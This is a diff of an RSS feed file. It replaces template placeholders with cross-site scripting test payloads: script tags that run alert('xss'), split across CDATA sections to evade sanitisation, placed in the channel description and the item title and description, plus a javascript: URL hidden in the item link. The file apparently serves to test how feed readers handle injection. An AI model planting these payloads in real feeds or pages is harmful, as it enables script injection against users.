@@ -1,29 +1,15 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <rss version="2.0">
   <channel>
-    <title>Your Feed Title</title>
-    <link>https://www.yourwebsite.com</link>
-    <description>Your feed description goes here.</description>
-    <language>en-us</language>
-    <pubDate>Fri, 28 Sep 2024 12:00:00 GMT</pubDate>
-    
+    <title>Your Site Title</title>
+    <link>https://google.com</link>
+    <description><![CDATA["]]><![CDATA[>]]><![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]></description>
     <item>
-      <title>Item Title 1</title>
-      <link>https://www.yourwebsite.com/item1</link>
-      <description>Description for item 1.</description>
-      <pubDate>Fri, 28 Sep 2024 12:00:00 GMT</pubDate>
-      <guid>https://www.yourwebsite.com/item1</guid>
+      <title><![CDATA["]]><![CDATA[>]]><![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]></title>
+      <link>https://google.com/@javascript:alert(`XSS in RSS link !`)</link>
+      <description><![CDATA["]]><![CDATA[>]]><![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]></description>
+      <pubDate>Fri, 24 Aug 2024 10:00:00 +0000</pubDate>
+      <guid>http://www.google.com</guid>
     </item>
-
-    <item>
-      <title>Item Title 2</title>
-      <link>https://www.yourwebsite.com/item2</link>
-      <description>Description for item 2.</description>
-      <pubDate>Fri, 28 Sep 2024 12:00:00 GMT</pubDate>
-      <guid>https://www.yourwebsite.com/item2</guid>
-    </item>
-
-    <!-- Add more items as needed -->
-
   </channel>
 </rss>
